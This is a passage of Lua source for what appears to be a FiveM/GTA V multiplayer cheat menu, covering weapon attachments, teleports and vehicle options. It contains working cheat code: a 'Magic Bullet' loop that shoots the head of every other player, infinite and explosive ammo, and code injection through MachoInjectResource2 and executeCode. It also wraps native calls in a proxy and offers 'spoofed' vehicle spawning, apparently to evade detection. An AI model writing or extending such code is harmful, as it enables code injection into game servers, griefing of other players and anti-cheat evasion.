                            { label = "Flashlight (Pistol)", value = "Flashlight (Pistol)" }, { label = "Flashlight (Pistol Alt)", value = "Flashlight (Pistol Alt)" }, { label = "Flashlight (Rifle)", value = "Flashlight (Rifle)" },
                            { label = "Grip",                value = "Grip" }, { label = "Grip (Alt)", value = "Grip (Alt)" },
                            { label = "Scope (Macro)",  value = "Scope (Macro)" }, { label = "Scope (Macro Alt)", value = "Scope (Macro Alt)" }, { label = "Scope (Small)", value = "Scope (Small)" }, { label = "Scope (Small Alt)", value = "Scope (Small Alt)" },
                            { label = "Scope (Medium)", value = "Scope (Medium)" }, { label = "Scope (Large)", value = "Scope (Large)" }, { label = "Scope (Advanced)", value = "Scope (Advanced)" },
                            { label = "Scope (Night Vision)", value = "Scope (Night Vision)" }, { label = "Scope (Thermal)", value = "Scope (Thermal)" },
                            { label = "Suppressor (Pistol)",  value = "Suppressor (Pistol)" }, { label = "Suppressor (Pistol Alt)", value = "Suppressor (Pistol Alt)" },
                            { label = "Suppressor (Rifle)", value = "Suppressor (Rifle)" }, { label = "Suppressor (Rifle Alt)", value = "Suppressor (Rifle Alt)" }, { label = "Suppressor (Sniper)", value = "Suppressor (Sniper)" },
                            { label = "Holographic Sight",  value = "Holographic Sight" }, { label = "Holographic Sight (SMG)", value = "Holographic Sight (SMG)" },
                            { label = "Extended Mag (Pistol)",    value = "Extended Mag (Pistol)" }, { label = "Extended Mag (Combat Pistol)", value = "Extended Mag (Combat Pistol)" }, { label = "Extended Mag (AP Pistol)", value = "Extended Mag (AP Pistol)" },
                            { label = "Extended Mag (Micro SMG)", value = "Extended Mag (Micro SMG)" }, { label = "Extended Mag (SMG)", value = "Extended Mag (SMG)" }, { label = "Drum Mag (SMG)", value = "Drum Mag (SMG)" },
                            { label = "Extended Mag (Assault Rifle)", value = "Extended Mag (Assault Rifle)" }, { label = "Drum Mag (Assault Rifle)", value = "Drum Mag (Assault Rifle)" },
                            { label = "Extended Mag (Carbine Rifle)", value = "Extended Mag (Carbine Rifle)" }, { label = "Box Mag (Carbine Rifle)", value = "Box Mag (Carbine Rifle)" },
                            { label = "Extended Mag (Advanced Rifle)",  value = "Extended Mag (Advanced Rifle)" }, { label = "Extended Mag (MG)", value = "Extended Mag (MG)" }, { label = "Extended Mag (Combat MG)", value = "Extended Mag (Combat MG)" },
                            { label = "Extended Mag (Assault Shotgun)", value = "Extended Mag (Assault Shotgun)" },
                            { label = "Compensator (Pistol)",           value = "Compensator (Pistol)" },
                            { label = "Luxury Finish (Pistol)",         value = "Luxury Finish (Pistol)" }, { label = "Luxury Finish (Combat Pistol)", value = "Luxury Finish (Combat Pistol)" }, { label = "Luxury Finish (AP Pistol)", value = "Luxury Finish (AP Pistol)" },
                            { label = "Luxury Finish (Micro SMG)",     value = "Luxury Finish (Micro SMG)" }, { label = "Luxury Finish (SMG)", value = "Luxury Finish (SMG)" }, { label = "Luxury Finish (Assault Rifle)", value = "Luxury Finish (Assault Rifle)" },
                            { label = "Luxury Finish (Carbine Rifle)", value = "Luxury Finish (Carbine Rifle)" }, { label = "Luxury Finish (MG)", value = "Luxury Finish (MG)" },
                            { label = "Luxury Finish (Pump Shotgun)", value = "Luxury Finish (Pump Shotgun)" }, { label = "Luxury Finish (Sniper Rifle)", value = "Luxury Finish (Sniper Rifle)" }
                        },
                        onConfirm = function(data)
                            local value = data.value
                            local bp = setmetatable({}, {
                                __index = function(_, k)
                                    local v = _G[k]
                                    return type(v) == "function" and function(...) return v(...) end or v
                                end
                            })

                            local componentMap = {
                                ["Flashlight (Pistol)"] = "COMPONENT_AT_PI_FLSH",
                                ["Flashlight (Pistol Alt)"] = "COMPONENT_AT_PI_FLSH_02",
                                ["Flashlight (Rifle)"] = "COMPONENT_AT_AR_FLSH",
                                ["Grip"] = "COMPONENT_AT_AR_AFGRIP",
                                ["Grip (Alt)"] = "COMPONENT_AT_AR_AFGRIP_02",
                                ["Scope (Macro)"] = "COMPONENT_AT_SCOPE_MACRO",
                                ["Scope (Macro Alt)"] = "COMPONENT_AT_SCOPE_MACRO_02",
                                ["Scope (Small)"] = "COMPONENT_AT_SCOPE_SMALL",
                                ["Scope (Small Alt)"] = "COMPONENT_AT_SCOPE_SMALL_02",
                                ["Scope (Medium)"] = "COMPONENT_AT_SCOPE_MEDIUM",
                                ["Scope (Large)"] = "COMPONENT_AT_SCOPE_LARGE",
                                ["Scope (Advanced)"] = "COMPONENT_AT_SCOPE_MAX",
                                ["Scope (Night Vision)"] = "COMPONENT_AT_SCOPE_NV",
                                ["Scope (Thermal)"] = "COMPONENT_AT_SCOPE_THERMAL",
                                ["Suppressor (Pistol)"] = "COMPONENT_AT_PI_SUPP",
                                ["Suppressor (Pistol Alt)"] = "COMPONENT_AT_PI_SUPP_02",
                                ["Suppressor (Rifle)"] = "COMPONENT_AT_AR_SUPP",
                                ["Suppressor (Rifle Alt)"] = "COMPONENT_AT_AR_SUPP_02",
                                ["Suppressor (Sniper)"] = "COMPONENT_AT_SR_SUPP",
                                ["Holographic Sight"] = "COMPONENT_AT_SIGHTS",
                                ["Holographic Sight (SMG)"] = "COMPONENT_AT_SIGHTS_SMG",
                                ["Extended Mag (Pistol)"] = "COMPONENT_PISTOL_CLIP_02",
                                ["Extended Mag (Combat Pistol)"] = "COMPONENT_COMBATPISTOL_CLIP_02",
                                ["Extended Mag (AP Pistol)"] = "COMPONENT_APPISTOL_CLIP_02",
                                ["Extended Mag (Micro SMG)"] = "COMPONENT_MICROSMG_CLIP_02",
                                ["Extended Mag (SMG)"] = "COMPONENT_SMG_CLIP_02",
                                ["Drum Mag (SMG)"] = "COMPONENT_SMG_CLIP_03",
                                ["Extended Mag (Assault Rifle)"] = "COMPONENT_ASSAULTRIFLE_CLIP_02",
                                ["Drum Mag (Assault Rifle)"] = "COMPONENT_ASSAULTRIFLE_CLIP_03",
                                ["Extended Mag (Carbine Rifle)"] = "COMPONENT_CARBINERIFLE_CLIP_02",
                                ["Box Mag (Carbine Rifle)"] = "COMPONENT_CARBINERIFLE_CLIP_03",
                                ["Extended Mag (Advanced Rifle)"] = "COMPONENT_ADVANCEDRIFLE_CLIP_02",
                                ["Extended Mag (MG)"] = "COMPONENT_MG_CLIP_02",
                                ["Extended Mag (Combat MG)"] = "COMPONENT_COMBATMG_CLIP_02",
                                ["Extended Mag (Assault Shotgun)"] = "COMPONENT_ASSAULTSHOTGUN_CLIP_02",
                                ["Compensator (Pistol)"] = "COMPONENT_AT_PI_COMP",
                                ["Luxury Finish (Pistol)"] = "COMPONENT_PISTOL_VARMOD_LUXE",
                                ["Luxury Finish (Combat Pistol)"] = "COMPONENT_COMBATPISTOL_VARMOD_LOWRIDER",
                                ["Luxury Finish (AP Pistol)"] = "COMPONENT_APPISTOL_VARMOD_LUXE",
                                ["Luxury Finish (Micro SMG)"] = "COMPONENT_MICROSMG_VARMOD_LUXE",
                                ["Luxury Finish (SMG)"] = "COMPONENT_SMG_VARMOD_LUXE",
                                ["Luxury Finish (Assault Rifle)"] = "COMPONENT_ASSAULTRIFLE_VARMOD_LUXE",
                                ["Luxury Finish (Carbine Rifle)"] = "COMPONENT_CARBINERIFLE_VARMOD_LUXE",
                                ["Luxury Finish (MG)"] = "COMPONENT_MG_VARMOD_LOWRIDER",
                                ["Luxury Finish (Pump Shotgun)"] = "COMPONENT_PUMPSHOTGUN_VARMOD_LOWRIDER",
                                ["Luxury Finish (Sniper Rifle)"] = "COMPONENT_SNIPERRIFLE_VARMOD_LUXE"
                            }

                            local ped = PlayerPedId()
                            local currentWeapon = GetSelectedPedWeapon(ped)
                            if not currentWeapon or currentWeapon == 0 then
                                showNotify("No weapon equipped!", "error")
                                return
                            end

                            local componentName = componentMap[value]
                            if not componentName then
                                showNotify("Invalid attachment!", "error")
                                return
                            end

                            local compHash = GetHashKey(componentName)
                            if not HasPedGotWeapon(ped, currentWeapon, false) then
                                GiveWeaponToPed(ped, currentWeapon, 0, false, true)
                            end

                            GiveWeaponComponentToPed(ped, currentWeapon, compHash)
                            showNotify("Applied: " .. value, "success")
                        end
                    },
                    {
                        type = "scroll",
                        label = "Weapon Tints",
                        selected = 1,
                        autoConfirm = true,
                        options = {
                            { label = "tint:0 - Normal",   value = "tint:0" },
                            { label = "tint:1 - Green",    value = "tint:1" },
                            { label = "tint:2 - Gold",     value = "tint:2" },
                            { label = "tint:3 - Pink",     value = "tint:3" },
                            { label = "tint:4 - Army",     value = "tint:4" },
                            { label = "tint:5 - LSPD",     value = "tint:5" },
                            { label = "tint:6 - Orange",   value = "tint:6" },
                            { label = "tint:7 - Platinum", value = "tint:7" }
                        },
                        onConfirm = function(data)
                            local value = data.value
                            local bp = setmetatable({}, {
                                __index = function(_, k)
                                    local v = _G[k]
                                    return type(v) == "function" and function(...) return v(...) end or v
                                end
                            })
                            local ped = bp.PlayerPedId()
                            local currentWeapon = bp.GetSelectedPedWeapon(ped)
                            if not currentWeapon or currentWeapon == 0 then
                                showNotify("No weapon equipped!", "error")
                                return
                            end

                            local tintIndex = tonumber(value:match("tint:(%d+)")) or 0
                            bp.SetPedWeaponTintIndex(ped, currentWeapon, tintIndex)
                            showNotify("Applied tint: " .. value, "success")
                        end
                    },
                    {
                        label     = "Magic Bullet",
                        type      = "checkbox",
                        onConfirm = function(checked)
                            local state = checked and true or false
                            if state then
                                local function AddVectors(v1, v2) return vector3(v1.x + v2.x, v1.y + v2.y, v1.z + v2.z) end
                                _G.MagicBullet = true
                                CreateThread(function()
                                    while _G.MagicBullet do
                                        Wait(1)
                                        if IsDisabledControlPressed(0, 24) then
                                            local shooterPed = PlayerPedId()
                                            local _, shooterWeapon = GetCurrentPedWeapon(shooterPed)
                                            for _, player in ipairs(GetActivePlayers()) do
                                                if player ~= PlayerId() then
                                                    local targetPed = GetPlayerPed(player)
                                                    if not IsPedDeadOrDying(targetPed, true) then
                                                        local bone = GetEntityBoneIndexByName(targetPed, "SKEL_HEAD")
                                                        local boneTarget = GetPedBoneCoords(targetPed, bone, 0.0, 0.0,
                                                            0.0)
                                                        local offsets = { vector3(0, 0, 0.1), vector3(0, 0.1, 0), vector3(
                                                            0.1, 0, 0) }
                                                        for _, off in ipairs(offsets) do
                                                            local src = AddVectors(boneTarget, off)
                                                            ShootSingleBulletBetweenCoords(src.x, src.y, src.z,
                                                                boneTarget.x, boneTarget.y, boneTarget.z, 500, true,
                                                                shooterWeapon, shooterPed, false, false, 666.0)
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end)
                            else
                                _G.MagicBullet = false
                            end
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Infinite Ammo",
                        icon = "ph-infinity",
                        checked = false,
                        onConfirm = function(
                            checked)
                            infammo(checked)
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Explosive Ammo",
                        icon = "ph-fire",
                        checked = false,
                        onConfirm = function(
                            checked)
                            explosiveAmmo(checked)
                        end
                    },
                    {
                        type = "checkbox",
                        label = "No Reload",
                        icon = "ph-infinity",
                        checked = false,
                        onConfirm = function(
                            checked)
                            noreload(checked)
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Invisible Weapon",
                        desc = "Makes your current weapon invisible",
                        checked = false,
                        onConfirm = function(
                            checked)
                            invisibleWeapon(checked)
                            if checked then
                                showNotify("Invisible weapon enabled", "success")
                            else
                                showNotify(
                                    "Invisible weapon disabled", "info")
                            end
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Insta Reload",
                        icon = "ph-arrows-clockwise",
                        checked = false,
                        onConfirm = function(
                            checked)
                            instaReload(checked)
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Force Weapon Wheel",
                        checked = false,
                        onConfirm = function(enabled)
                            if enabled then
                                _G.ForceWeaponWheelThread = CreateThread(function()
                                    while _G.ForceWeaponWheelThread do
                                        Wait(0)
                                        MachoInjectResource2(NewThreadNs, 'any', [[
                                            EnableAllControlActions(0)
                                            ShowHudComponentThisFrame(2)
                                            ShowHudComponentThisFrame(19)
                                            ShowHudComponentThisFrame(20)
                                            ShowHudComponentThisFrame(21)
                                            ShowHudComponentThisFrame(22)
                                        ]])
                                    end
                                end)
                                showNotify("Force weapon wheel enabled", "success")
                            else
                                if _G.ForceWeaponWheelThread then
                                    _G.ForceWeaponWheelThread = nil
                                end
                                showNotify("Force weapon wheel disabled", "info")
                            end
                        end
                    },
                    {
                        type = "slider",
                        label = "Weapon Damage",
                        icon = "ph-sword",
                        desc = "Changes the damage of weapons",
                        value = 1.0,
                        step = 0.1,
                        min = 0.0,
                        max = 10.0,
                        onConfirm = function(sliderValue)
                            weapondamage(sliderValue)
                            showNotify("Weapon damage set to: " .. sliderValue, "success")
                        end
                    },
                }
            }
        }
    },
    {
        label = 'Teleportation',
        icon = 'ph-map-pin',
        type = 'submenu',
        tabs = {
            {
                name = 'Main',
                submenu = {
                    {
                        label = "Teleport to Waypoint",
                        type = "button",
                        onConfirm = function()
                            executeCode('any', [[
            local function getSafeGroundZ(x, y, fallbackZ)
                local foundGround, groundZ = false, fallbackZ

                for height = 0.0, 1000.0, 25.0 do
                    foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                    if foundGround then
                        return groundZ + 1.0
                    end
                end

                return fallbackZ + 1.0
            end

            local blip = GetFirstBlipInfoId(8)
            if not DoesBlipExist(blip) then
                return
            end

            local coords = GetBlipInfoIdCoord(blip)
            local ped = PlayerPedId()
            if not DoesEntityExist(ped) then
                return
            end

            local safeZ = getSafeGroundZ(coords.x, coords.y, coords.z)

            local entityToCheck = ped
            if IsPedInAnyVehicle(ped, false) then
                entityToCheck = GetVehiclePedIsIn(ped, false)
            end

            RequestCollisionAtCoord(coords.x, coords.y, safeZ)
            FreezeEntityPosition(entityToCheck, true)

            SetPedCoordsKeepVehicle(ped, coords.x, coords.y, safeZ)

            local startTime = GetGameTimer()
            while (GetGameTimer() - startTime) < 5000 do
                RequestCollisionAtCoord(coords.x, coords.y, safeZ)

                if HasCollisionLoadedAroundEntity(entityToCheck) then
                    break
                end

                Wait(50)
            end

            FreezeEntityPosition(entityToCheck, false)
        ]])
                        end
                    },
                    {
                        label = "Print Current Coords",
                        type = "button",
                        onConfirm = function()
                            executeCode('any', [[
            local ped = PlayerPedId()

            if not DoesEntityExist(ped) then
                print("Ped does not exist.")
                return
            end

            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)

            print(string.format(
                "Current Coords: vector4(%.2f, %.2f, %.2f, %.2f)",
                coords.x,
                coords.y,
                coords.z,
                heading
            ))
        ]])
                        end
                    },
                    {
                        label = "Teleport to Grove",
                        type = "button",
                        onConfirm = function()
                            executeCode('any', [[
            local targetX, targetY, targetZ = 100.0, -1940.0, 20.3

            local function getSafeGroundZ(x, y, fallbackZ)
                local foundGround, groundZ = false, fallbackZ

                for height = 0.0, 1000.0, 25.0 do
                    foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                    if foundGround then
                        return groundZ + 1.0
                    end
                end

                return fallbackZ + 1.0
            end

            local ped = PlayerPedId()
            if not DoesEntityExist(ped) then
                return
            end

            local entityToTeleport = ped
            if IsPedInAnyVehicle(ped, false) then
                entityToTeleport = GetVehiclePedIsIn(ped, false)
            end

            local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

            RequestCollisionAtCoord(targetX, targetY, safeZ)

            FreezeEntityPosition(entityToTeleport, true)

            SetEntityCoords(entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

            local startTime = GetGameTimer()
            while (GetGameTimer() - startTime) < 5000 do
                RequestCollisionAtCoord(targetX, targetY, safeZ)

                if HasCollisionLoadedAroundEntity(entityToTeleport) then
                    break
                end

                Wait(50)
            end

            FreezeEntityPosition(entityToTeleport, false)
        ]])
                        end
                    },
                    {
                        label = "Teleport to Sandy Airfield",
                        type = "button",
                        onConfirm = function()
                            executeCode('any', [[
            local targetX, targetY, targetZ = 1740.0, 3273.0, 41.1

            local function getSafeGroundZ(x, y, fallbackZ)
                local foundGround, groundZ = false, fallbackZ
                for height = 0.0, 1000.0, 25.0 do
                    foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                    if foundGround then
                        return groundZ + 1.0
                    end
                end
                return fallbackZ + 1.0
            end

            local ped = PlayerPedId()
            if not DoesEntityExist(ped) then return end

            local entityToTeleport = ped
            if IsPedInAnyVehicle(ped, false) then
                entityToTeleport = GetVehiclePedIsIn(ped, false)
            end

            local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

            RequestCollisionAtCoord(targetX, targetY, safeZ)
            FreezeEntityPosition(entityToTeleport, true)
            SetEntityCoords(entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

            local startTime = GetGameTimer()
            while (GetGameTimer() - startTime) < 5000 do
                RequestCollisionAtCoord(targetX, targetY, safeZ)
                if HasCollisionLoadedAroundEntity(entityToTeleport) then
                    break
                end
                Wait(50)
            end

            FreezeEntityPosition(entityToTeleport, false)
        ]])
                        end
                    },
                    {
                        label = "Teleport to Legion Square",
                        type = "button",
                        onConfirm = function()
                            executeCode('any', [[
            local targetX, targetY, targetZ = 215.76, -810.12, 30.73

            local function getSafeGroundZ(x, y, fallbackZ)
                local foundGround, groundZ = false, fallbackZ
                for height = 0.0, 1000.0, 25.0 do
                    foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                    if foundGround then
                        return groundZ + 1.0
                    end
                end
                return fallbackZ + 1.0
            end

            local ped = PlayerPedId()
            if not DoesEntityExist(ped) then return end

            local entityToTeleport = ped
            if IsPedInAnyVehicle(ped, false) then
                entityToTeleport = GetVehiclePedIsIn(ped, false)
            end

            local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

            RequestCollisionAtCoord(targetX, targetY, safeZ)
            FreezeEntityPosition(entityToTeleport, true)
            SetEntityCoords(entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

            local startTime = GetGameTimer()
            while (GetGameTimer() - startTime) < 5000 do
                RequestCollisionAtCoord(targetX, targetY, safeZ)
                if HasCollisionLoadedAroundEntity(entityToTeleport) then
                    break
                end
                Wait(50)
            end

            FreezeEntityPosition(entityToTeleport, false)
        ]])
                        end
                    },
                    {
                        label = "Teleport to Mount Chiliad",
                        type = "button",
                        onConfirm = function()
                            executeCode('any', [[
            local targetX, targetY, targetZ = 501.5, 5604.8, 797.9

            local function getSafeGroundZ(x, y, fallbackZ)
                local foundGround, groundZ = false, fallbackZ
                for height = 0.0, 1000.0, 25.0 do
                    foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                    if foundGround then
                        return groundZ + 1.0
                    end
                end
                return fallbackZ + 1.0
            end

            local ped = PlayerPedId()
            if not DoesEntityExist(ped) then return end

            local entityToTeleport = ped
            if IsPedInAnyVehicle(ped, false) then
                entityToTeleport = GetVehiclePedIsIn(ped, false)
            end

            local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

            RequestCollisionAtCoord(targetX, targetY, safeZ)
            FreezeEntityPosition(entityToTeleport, true)
            SetEntityCoords(entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

            local startTime = GetGameTimer()
            while (GetGameTimer() - startTime) < 5000 do
                RequestCollisionAtCoord(targetX, targetY, safeZ)
                if HasCollisionLoadedAroundEntity(entityToTeleport) then
                    break
                end
                Wait(50)
            end

            FreezeEntityPosition(entityToTeleport, false)
        ]])
                        end
                    },
                    {
                        label = "Teleport to Paleto Bay",
                        type = "button",
                        onConfirm = function()
                            executeCode('any', [[
            local targetX, targetY, targetZ = -448.2, 6011.6, 31.7

            local function getSafeGroundZ(x, y, fallbackZ)
                local foundGround, groundZ = false, fallbackZ
                for height = 0.0, 1000.0, 25.0 do
                    foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                    if foundGround then
                        return groundZ + 1.0
                    end
                end
                return fallbackZ + 1.0
            end

            local ped = PlayerPedId()
            if not DoesEntityExist(ped) then return end

            local entityToTeleport = ped
            if IsPedInAnyVehicle(ped, false) then
                entityToTeleport = GetVehiclePedIsIn(ped, false)
            end

            local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

            RequestCollisionAtCoord(targetX, targetY, safeZ)
            FreezeEntityPosition(entityToTeleport, true)
            SetEntityCoords(entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

            local startTime = GetGameTimer()
            while (GetGameTimer() - startTime) < 5000 do
                RequestCollisionAtCoord(targetX, targetY, safeZ)
                if HasCollisionLoadedAroundEntity(entityToTeleport) then
                    break
                end
                Wait(50)
            end

            FreezeEntityPosition(entityToTeleport, false)
        ]])
                        end
                    },
                    {
                        label = "Teleport to Fort Zancudo",
                        type = "button",
                        onConfirm = function()
                            executeCode('any', [[
            local targetX, targetY, targetZ = -2047.4, 3132.1, 32.8

            local function getSafeGroundZ(x, y, fallbackZ)
                local foundGround, groundZ = false, fallbackZ
                for height = 0.0, 1000.0, 25.0 do
                    foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                    if foundGround then
                        return groundZ + 1.0
                    end
                end
                return fallbackZ + 1.0
            end

            local ped = PlayerPedId()
            if not DoesEntityExist(ped) then return end

            local entityToTeleport = ped
            if IsPedInAnyVehicle(ped, false) then
                entityToTeleport = GetVehiclePedIsIn(ped, false)
            end

            local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

            RequestCollisionAtCoord(targetX, targetY, safeZ)
            FreezeEntityPosition(entityToTeleport, true)
            SetEntityCoords(entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

            local startTime = GetGameTimer()
            while (GetGameTimer() - startTime) < 5000 do
                RequestCollisionAtCoord(targetX, targetY, safeZ)
                if HasCollisionLoadedAroundEntity(entityToTeleport) then
                    break
                end
                Wait(50)
            end

            FreezeEntityPosition(entityToTeleport, false)
        ]])
                        end
                    },
                    {
                        label = "Teleport to Los Santos Airport",
                        type = "button",
                        onConfirm = function()
                            executeCode('any', [[
            local targetX, targetY, targetZ = -1034.6, -2733.6, 20.1

            local function getSafeGroundZ(x, y, fallbackZ)
                local foundGround, groundZ = false, fallbackZ
                for height = 0.0, 1000.0, 25.0 do
                    foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                    if foundGround then
                        return groundZ + 1.0
                    end
                end
                return fallbackZ + 1.0
            end

            local ped = PlayerPedId()
            if not DoesEntityExist(ped) then return end

            local entityToTeleport = ped
            if IsPedInAnyVehicle(ped, false) then
                entityToTeleport = GetVehiclePedIsIn(ped, false)
            end

            local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

            RequestCollisionAtCoord(targetX, targetY, safeZ)
            FreezeEntityPosition(entityToTeleport, true)
            SetEntityCoords(entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

            local startTime = GetGameTimer()
            while (GetGameTimer() - startTime) < 5000 do
                RequestCollisionAtCoord(targetX, targetY, safeZ)
                if HasCollisionLoadedAroundEntity(entityToTeleport) then
                    break
                end
                Wait(50)
            end

            FreezeEntityPosition(entityToTeleport, false)
        ]])
                        end
                    },
                    {
                        label = "Teleport to Coords",
                        type = "button",
                        onConfirm = function()
                            showInput("Enter Coordinates (x, y, z)", "", function(coordInput)
                                if coordInput and coordInput ~= "" then
                                    local x, y, z = string.match(coordInput,
                                        "([%-%d%.]+)[, ]+([%-%d%.]+)[, ]+([%-%d%.]+)")
                                    x, y, z = tonumber(x), tonumber(y), tonumber(z)

                                    if x and y and z then
                                        executeCode('any', string.format([[
                        local targetX, targetY, targetZ = %f, %f, %f

                        local function getSafeGroundZ(x, y, fallbackZ)
                            local foundGround, groundZ = false, fallbackZ

                            for height = 0.0, 1000.0, 25.0 do
                                foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                if foundGround then
                                    return groundZ + 1.0
                                end
                            end

                            return fallbackZ + 1.0
                        end

                        local ped = PlayerPedId()
                        if not DoesEntityExist(ped) then
                            return
                        end

                        local entityToCheck = ped
                        if IsPedInAnyVehicle(ped, false) then
                            entityToCheck = GetVehiclePedIsIn(ped, false)
                        end

                        local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

                        RequestCollisionAtCoord(targetX, targetY, safeZ)
                        FreezeEntityPosition(entityToCheck, true)

                        SetPedCoordsKeepVehicle(ped, targetX, targetY, safeZ)

                        local startTime = GetGameTimer()
                        while (GetGameTimer() - startTime) < 5000 do
                            RequestCollisionAtCoord(targetX, targetY, safeZ)

                            if HasCollisionLoadedAroundEntity(entityToCheck) then
                                break
                            end

                            Wait(50)
                        end

                        FreezeEntityPosition(entityToCheck, false)
                    ]], x, y, z))
                                    else
                                        showNotify("Invalid coords format. Use: x, y, z", "error")
                                    end
                                end
                            end, "typeable")
                        end
                    }
                }
            }
        }
    },
    {
        label = 'Vehicles',
        icon = 'ph-car',
        type = 'submenu',
        tabs = {
            {
                name = 'Options',
                submenu = {
                    {
                        type = 'checkbox',
                        label = 'Spoofed Vehicle Spawning',
                        onConfirm = function(checked)
                            spoofedVehicleSpawning = checked
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Force Engine On',
                        onConfirm = function(checked)
                            EngineForceOn = checked
                            if checked then
                                CreateThread(function()
                                    while EngineForceOn do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                            SetVehicleEngineHealth(veh, 1000.0)
                                            SetVehicleCanEngineOperateOnFire(veh, true)
                                            SetVehicleEngineCanDegrade(veh, false)
                                            SetVehicleKeepEngineOnWhenAbandoned(veh, true)
                                            SetVehicleEngineOn(veh, true, true, false)
                                        end
                                        Wait(5)
                                    end
                                end)
                            else
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsUsing(ped)
                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                    SetVehicleCanEngineOperateOnFire(veh, false)
                                    SetVehicleEngineCanDegrade(veh, true)
                                    SetVehicleKeepEngineOnWhenAbandoned(veh, false)
                                end
                            end
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Vehicle Godmode',
                        onConfirm = function(checked)
                            VehicleGodmode = checked
                            if checked then
                                CreateThread(function()
                                    while VehicleGodmode do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                            SetEntityInvincible(veh, true)
                                        end
                                        Wait(1)
                                    end
                                end)
                            else
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsUsing(ped)
                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                    SetEntityInvincible(veh, false)
                                end
                            end
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Vehicle Invisibility',
                        onConfirm = function(checked)
                            VehicleInvisibility = checked
                            if checked then
                                CreateThread(function()
                                    while VehicleInvisibility do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                            SetEntityVisible(veh, false, false)
                                        end
                                        Wait(1)
                                    end
                                end)
                            else
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsUsing(ped)
                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                    SetEntityVisible(veh, true, false)
                                end
                            end
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Freeze Vehicle',
                        onConfirm = function(checked)
                            FreezeVehicle = checked
                            if checked then
                                CreateThread(function()
                                    while FreezeVehicle do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                            FreezeEntityPosition(veh, true)
                                        end
                                        Wait(1)
                                    end
                                end)
                            else
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsUsing(ped)
                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                    FreezeEntityPosition(veh, false)
                                end
                            end
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Vehicle Hop',
                        onConfirm = function(checked)
                            VehicleJump = checked
                            if checked then
                                CreateThread(function()
                                    while VehicleJump do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                            if IsDisabledControlPressed(0, 22) then
                                                local JumpForce = 6.0
                                                ApplyForceToEntity(veh, 1, 0.0, 0.0, JumpForce, 0.0, 0.0, 0.0, 0, true,
                                                    true, true, true, true)
                                            end
                                        end
                                        Wait(1)
                                    end
                                end)
                            end
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Instant Brakes',
                        onConfirm = function(checked)
                            InstantBreak = checked
                            if checked then
                                CreateThread(function()
                                    while InstantBreak do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                            if IsDisabledControlPressed(0, 33) and IsPedInAnyVehicle(ped, false) then
                                                SetVehicleForwardSpeed(veh, 0.0)
                                            end
                                        end
                                        Wait(1)
                                    end
                                end)
                            end
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Bulletproof Tires',
                        onConfirm = function(checked)
                            BulletproofTires = checked
                            if checked then
                                CreateThread(function()
                                    while BulletproofTires do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 then
                                            SetVehicleTyresCanBurst(veh, false)
                                        end
                                        Wait(1)
                                    end
                                end)
                            else
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsUsing(ped)
                                if veh and veh ~= 0 then
                                    SetVehicleTyresCanBurst(veh, true)
                                end
                            end
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Unlimited Fuel',
                        onConfirm = function(checked)
                            unlimitedFuel = checked
                            if checked then
                                CreateThread(function()
                                    while unlimitedFuel do
                                        local ped = PlayerPedId()
